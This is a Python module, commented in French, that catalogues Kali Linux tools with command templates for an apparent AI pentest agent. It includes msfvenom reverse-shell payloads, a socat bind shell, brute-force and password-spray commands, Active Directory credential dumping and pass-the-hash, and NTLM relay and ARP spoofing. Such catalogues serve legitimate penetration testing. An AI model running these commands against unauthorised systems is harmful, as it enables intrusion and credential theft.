"""
Catalogue des outils Kali Linux organisés par catégorie.
Fournit descriptions, exemples de commandes, et helpers pour l'IA.
"""
from dataclasses import dataclass, field
from typing import List, Optional


@dataclass
class KaliTool:
    name: str
    category: str
    description: str
    examples: List[str]
    timeout: int = 60
    interactive: bool = False
    notes: Optional[str] = None


KALI_TOOLS: List[KaliTool] = [
    # ── RECONNAISSANCE ────────────────────────────────────────────────────────
    KaliTool("nmap", "recon", "Scanner réseau/ports — fingerprinting OS/services",
             ["nmap -sV -sC -p- {target}",
              "nmap -sU --top-ports 100 {target}",
              "nmap --script vuln -p 80,443 {target}",
              "nmap -sn 192.168.1.0/24"],
             timeout=300),

    KaliTool("masscan", "recon", "Scanner de ports ultra-rapide (millions de ports/s)",
             ["masscan -p1-65535 {target} --rate=1000",
              "masscan -p80,443 10.0.0.0/8 --rate=10000"],
             timeout=300),

    KaliTool("rustscan", "recon", "Scanner de ports rapide en Rust, pipe vers nmap",
             ["rustscan -a {target} -- -sV -sC",
              "rustscan -a {target} -p 1-1000"],
             timeout=120),

    KaliTool("arp-scan", "recon", "Découverte d'hôtes par ARP sur le réseau local",
             ["arp-scan -l",
              "arp-scan --interface=eth0 192.168.1.0/24"],
             timeout=30),

    KaliTool("netdiscover", "recon", "Détection d'hôtes actifs par ARP passif/actif",
             ["netdiscover -r 192.168.1.0/24",
              "netdiscover -i eth0 -p"],
             timeout=60),

    KaliTool("dnsenum", "recon", "Énumération DNS complète (zones, sous-domaines, brute-force)",
             ["dnsenum {domain}",
              "dnsenum --dnsserver 8.8.8.8 --enum {domain}"],
             timeout=120),

    KaliTool("dnsrecon", "recon", "Reconnaissance DNS avancée avec multiples techniques",
             ["dnsrecon -d {domain}",
              "dnsrecon -d {domain} -t brt -D /usr/share/wordlists/dnsmap.txt"],
             timeout=120),

    KaliTool("amass", "recon", "Cartographie de surface d'attaque — sous-domaines passifs/actifs",
             ["amass enum -d {domain}",
              "amass enum -active -d {domain} -o out.txt"],
             timeout=600),

    KaliTool("theharvester", "recon", "OSINT : emails, noms, IPs, URLs depuis sources publiques",
             ["theharvester -d {domain} -b all",
              "theharvester -d {domain} -b google,bing,linkedin -l 200"],
             timeout=300),

    KaliTool("sublist3r", "recon", "Énumération de sous-domaines via moteurs de recherche",
             ["sublist3r -d {domain}",
              "sublist3r -d {domain} -t 50 -o subdomains.txt"],
             timeout=300),

    KaliTool("whois", "recon", "Informations d'enregistrement domaine/IP",
             ["whois {target}",
              "whois -h whois.arin.net {ip}"],
             timeout=30),

    # ── SCAN WEB ──────────────────────────────────────────────────────────────
    KaliTool("nikto", "web", "Scanner de vulnérabilités web — LFI, XSS, info disclosure",
             ["nikto -h http://{target}",
              "nikto -h http://{target} -p 8080 -ssl",
              "nikto -h http://{target} -Tuning x6"],
             timeout=600),

    KaliTool("gobuster", "web", "Brute-force de répertoires/fichiers/DNS/vhosts",
             ["gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
              "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -x php,html,txt",
              "gobuster dns -d {domain} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
              "gobuster vhost -u http://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"],
             timeout=300),

    KaliTool("ffuf", "web", "Fuzzer web rapide — répertoires, paramètres, vhosts, LFI",
             ["ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://{target}/FUZZ",
              "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://{target}/page?file=FUZZ'",
              "ffuf -w users.txt:USER -w pass.txt:PASS -u http://{target}/login -d 'user=USER&pass=PASS' -mc 302"],
             timeout=300),

    KaliTool("sqlmap", "web", "Détection et exploitation automatique d'injections SQL",
             ["sqlmap -u 'http://{target}/page?id=1' --dbs",
              "sqlmap -u 'http://{target}/page?id=1' -D dbname --tables",
              "sqlmap -r request.txt --level=5 --risk=3 --dbs",
              "sqlmap -u 'http://{target}' --forms --crawl=2 --dbs"],
             timeout=600),

    KaliTool("wpscan", "web", "Scanner WordPress — plugins vulnérables, thèmes, utilisateurs",
             ["wpscan --url http://{target}",
              "wpscan --url http://{target} --enumerate u,p,t",
              "wpscan --url http://{target} -P /usr/share/wordlists/rockyou.txt -U admin"],
             timeout=300),

    KaliTool("whatweb", "web", "Fingerprinting de technologies web",
             ["whatweb http://{target}",
              "whatweb -a 3 http://{target}",
              "whatweb -i targets.txt --log-json=out.json"],
             timeout=60),

    # ── ATTAQUES MOT DE PASSE ─────────────────────────────────────────────────
    KaliTool("hydra", "passwords", "Brute-force de services d'authentification",
             ["hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
              "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{target}",
              "hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://{target}"],
             timeout=600),

    KaliTool("hashcat", "passwords", "Cracking de hash GPU-accelerated — tous modes",
             ["hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt",
              "hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
              "hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt",
              "hashcat --example-hashes | grep -A2 'MODE: {mode}'"],
             timeout=3600),

    KaliTool("john", "passwords", "John the Ripper — cracking de hash polyvalent",
             ["john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
              "john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
              "john hash.txt --show"],
             timeout=3600),

    KaliTool("crackmapexec", "passwords", "Swiss army knife pour l'énumération réseau Windows/AD",
             ["crackmapexec smb {target} -u users.txt -p passwords.txt",
              "crackmapexec smb {target} -u admin -p 'Password123' --shares",
              "crackmapexec ldap {target} -u '' -p '' --users",
              "crackmapexec winrm {target} -u admin -p 'Password123' -x 'whoami'"],
             timeout=300),

    KaliTool("evil-winrm", "passwords", "Shell WinRM pour post-exploitation Windows",
             ["evil-winrm -i {target} -u admin -p 'Password123'",
              "evil-winrm -i {target} -u admin -H {nthash}"],
             interactive=True, timeout=0),

    KaliTool("kerbrute", "passwords", "Attaques Kerberos — enum users, password spray, brute-force",
             ["kerbrute userenum --dc {dc} -d {domain} users.txt",
              "kerbrute passwordspray --dc {dc} -d {domain} users.txt 'Password123'",
              "kerbrute bruteuser --dc {dc} -d {domain} admin /usr/share/wordlists/rockyou.txt"],
             timeout=300),

    # ── EXPLOITATION ──────────────────────────────────────────────────────────
    KaliTool("msfvenom", "exploitation", "Génération de payloads Metasploit",
             ["msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell",
              "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe",
              "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw -o shell.php",
              "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f py -b '\\x00'",
              "msfvenom --list payloads | grep linux/x64"],
             timeout=120),

    KaliTool("searchsploit", "exploitation", "Recherche dans la base ExploitDB",
             ["searchsploit {service} {version}",
              "searchsploit -t 'remote code execution' apache",
              "searchsploit -x {exploit_id}",
              "searchsploit --id {term}"],
             timeout=30),

    # ── ANALYSE BINAIRE ET REVERSE ENGINEERING ────────────────────────────────
    KaliTool("gdb", "reversing", "Débogueur GNU — analyse binaires Linux, exploit dev",
             ["gdb ./{binary}",
              "gdb -batch -ex 'run' -ex 'bt' ./{binary} < input",
              "gdb --args ./{binary} arg1 arg2"],
             interactive=True, timeout=0,
             notes="Utiliser avec pwndbg/peda/gef pour l'exploit dev"),

    KaliTool("r2", "reversing", "Radare2 — framework RE complet, analyse statique/dynamique",
             ["r2 -A ./{binary}",
              "r2 -d ./{binary}",
              "r2 -q -c 'aaa;pdf @main' ./{binary}",
              "r2 -q -c 'aaa;/R pop rdi' ./{binary}"],
             timeout=120),

    KaliTool("objdump", "reversing", "Désassemblage et dump de binaires ELF/PE",
             ["objdump -d ./{binary}",
              "objdump -d -M intel ./{binary}",
              "objdump -d ./{binary} | grep -A5 'call'",
              "objdump -p ./{binary}",
              "objdump -t ./{binary}"],
             timeout=60),

    KaliTool("readelf", "reversing", "Lecture des headers ELF, sections, segments, symboles",
             ["readelf -a ./{binary}",
              "readelf -h ./{binary}",
              "readelf -S ./{binary}",
              "readelf -d ./{binary}",
              "readelf -s ./{binary}"],
             timeout=30),

    KaliTool("ROPgadget", "reversing", "Recherche de gadgets ROP dans les binaires",
             ["ROPgadget --binary ./{binary}",
              "ROPgadget --binary ./{binary} --rop",
              "ROPgadget --binary ./{binary} | grep 'pop rdi'",
              "ROPgadget --binary ./{binary} --chain execve",
              "ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rdi'"],
             timeout=120),

    KaliTool("ropper", "reversing", "Recherche de gadgets ROP/JOP/COP",
             ["ropper -f ./{binary}",
              "ropper -f ./{binary} --search 'pop rdi'",
              "ropper -f ./{binary} --type rop",
              "ropper -f ./{binary} --chain execve --badbytes '\\x00'"],
             timeout=120),

    KaliTool("checksec", "reversing", "Vérification des protections d'un binaire (NX/PIE/RELRO/canary/CFG)",
             ["checksec --file=./{binary}",
              "checksec --proc={pid}",
              "checksec --fortify-file=./{binary}"],
             timeout=10),

    KaliTool("binwalk", "reversing", "Analyse de firmwares — extraction de fichiers embarqués",
             ["binwalk {file}",
              "binwalk -e {file}",
              "binwalk -Me {file}",
              "binwalk --disasm {file}"],
             timeout=120),

    KaliTool("ltrace", "reversing", "Trace des appels de bibliothèques",
             ["ltrace ./{binary}",
              "ltrace -e 'strcmp' ./{binary}",
              "ltrace -f -e '*' ./{binary}"],
             timeout=30),

    KaliTool("strace", "reversing", "Trace des appels système",
             ["strace ./{binary}",
              "strace -e open,read,write ./{binary}",
              "strace -f ./{binary}"],
             timeout=30),

    # ── RÉSEAU AVANCÉ ──────────────────────────────────────────────────────────
    KaliTool("tcpdump", "network", "Capture réseau en ligne de commande",
             ["tcpdump -i eth0 -w capture.pcap",
              "tcpdump -i any port 80 -A",
              "tcpdump -r capture.pcap 'tcp port 443'",
              "tcpdump -i eth0 host {target} -w out.pcap"],
             timeout=60),

    KaliTool("tshark", "network", "Wireshark en ligne de commande — analyse de captures",
             ["tshark -r capture.pcap",
              "tshark -r capture.pcap -Y 'http.request'",
              "tshark -i eth0 -w capture.pcap",
              "tshark -r capture.pcap -T fields -e ip.src -e http.host"],
             timeout=60),

    KaliTool("responder", "network", "LLMNR/NBT-NS/mDNS poisoning — capture hashes NTLMv2",
             ["responder -I eth0 -rdwv",
              "responder -I eth0 -A"],
             timeout=300),

    KaliTool("bettercap", "network", "Framework MITM réseau — ARP spoofing, sniffer, caplets",
             ["bettercap -iface eth0",
              "bettercap -iface eth0 -caplet arp-spoofing.cap"],
             interactive=True, timeout=0),

    KaliTool("socat", "network", "Relay réseau polyvalent — tunnels, bind/reverse shells",
             ["socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/bash",
              "socat - TCP:{target}:{port}",
              "socat TCP-LISTEN:{port} STDOUT"],
             timeout=60),

    KaliTool("netcat", "network", "Couteau suisse réseau — connexions, écoute, transfert",
             ["nc -lvnp {port}",
              "nc {target} {port}",
              "nc -z {target} 1-1000"],
             timeout=60),

    # ── IMPACKET ─────────────────────────────────────────────────────────────
    KaliTool("impacket-secretsdump", "exploitation", "Dump de credentials AD — NTDS.dit, SAM, LSA",
             ["impacket-secretsdump {domain}/{user}:{pass}@{target}",
              "impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL",
              "impacket-secretsdump -hashes :{nthash} {domain}/{user}@{target}"],
             timeout=120),

    KaliTool("impacket-psexec", "exploitation", "Exécution de commandes via SMB (PsExec style)",
             ["impacket-psexec {domain}/{user}:{pass}@{target}",
              "impacket-psexec -hashes :{nthash} {domain}/{user}@{target} cmd.exe"],
             timeout=60),

    KaliTool("impacket-ntlmrelayx", "exploitation", "Relay d'authentification NTLM",
             ["impacket-ntlmrelayx -tf targets.txt -smb2support",
              "impacket-ntlmrelayx -tf targets.txt -smb2support -i"],
             timeout=300),

    # ── FORENSICS ──────────────────────────────────────────────────────────────
    KaliTool("volatility3", "forensics", "Analyse de dumps mémoire — processus, réseau, artifacts",
             ["volatility3 -f memory.dmp windows.info",
              "volatility3 -f memory.dmp windows.pslist",
              "volatility3 -f memory.dmp windows.netscan",
              "volatility3 -f memory.dmp windows.dumpfiles --virtaddr {addr}"],
             timeout=300),

    KaliTool("exiftool", "forensics", "Lecture/écriture de métadonnées de fichiers",
             ["exiftool {file}",
              "exiftool -all= {file}",
              "exiftool -Comment='test' {file}"],
             timeout=30),
]

# ── Indexation par nom et catégorie ──────────────────────────────────────────
_BY_NAME: dict = {t.name: t for t in KALI_TOOLS}
_BY_CATEGORY: dict = {}
for tool in KALI_TOOLS:
    _BY_CATEGORY.setdefault(tool.category, []).append(tool)

CATEGORIES = sorted(_BY_CATEGORY.keys())


def get_tool(name: str) -> KaliTool | None:
    return _BY_NAME.get(name)


def get_by_category(category: str) -> list:
    return _BY_CATEGORY.get(category, [])


def search_tools(query: str) -> list:
    q = query.lower()
    return [
        t for t in KALI_TOOLS
        if q in t.name.lower()
        or q in t.description.lower()
        or q in t.category.lower()
        or any(q in ex.lower() for ex in t.examples)
    ]


def get_tool_timeout(name: str) -> int:
    tool = _BY_NAME.get(name)
    return tool.timeout if tool else 60


def list_interactive_tools() -> list:
    return [t.name for t in KALI_TOOLS if t.interactive]


def catalog_summary() -> str:
    lines = ["Outils Kali disponibles par catégorie :"]
    for cat in CATEGORIES:
        tools = _BY_CATEGORY[cat]
        names = ", ".join(t.name for t in tools)
        lines.append(f"  [{cat}] {names}")
    return "\n".join(lines)
